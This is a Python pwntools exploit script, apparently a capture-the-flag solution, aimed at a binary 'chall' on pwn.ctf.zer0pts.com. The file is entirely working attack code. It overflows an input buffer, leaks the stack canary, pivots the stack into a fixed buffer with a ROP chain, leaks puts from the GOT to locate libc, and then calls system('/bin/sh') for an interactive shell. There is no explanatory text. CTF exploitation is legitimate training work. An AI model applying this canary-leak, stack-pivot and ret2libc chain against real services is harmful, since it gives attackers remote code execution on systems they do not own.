from pwn import *

e = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.ctf.zer0pts.com", 9002)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})


p.sendlineafter(">", "A" * 0x60 + "%[^a]")
p.sendlineafter(">", "15")

p.sendlineafter(":", "Z")

p.recvuntil("close to ")
leak = u64(bytearray(struct.pack("d", float(p.recvuntil(" seconds", drop=True)))))

print(hex(leak))

if leak % 0x100000 == 0:
  print("ABORTING")
  exit(1)

p.sendline("")
p.sendline("")


debug()

buff = 0x602f00

prdi = 0x00400e93    
prsi = 0x00400e91 
leaveret = 0x400e2d
p.sendlineafter("Y/n", "A" * 0x18 + p64(leak) + p64(buff - 8) + p64(prdi) + p64(0x602100) + p64(prsi) + p64(buff) + p64(0x1337) + p64(e.symbols["__isoc99_scanf"]) + p64(leaveret))

ui.pause()

p.sendline(p64(prdi) + p64(e.got["puts"]) + p64(e.symbols["puts"]) + p64(prdi) + p64(buff + 0x48) + p64(prsi) + p64(buff + 0x48 - len("a\n")) + p64(0x1337) + p64(e.symbols["__isoc99_scanf"]) + "%[^b]".ljust(8, "\x00") + "a")

p.recvuntil(" ")
leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["puts"]
print(hex(leak))

p.sendline(p64(prdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(prdi + 1) + p64(leak + libc.symbols["system"]) + "b")


p.interactive()
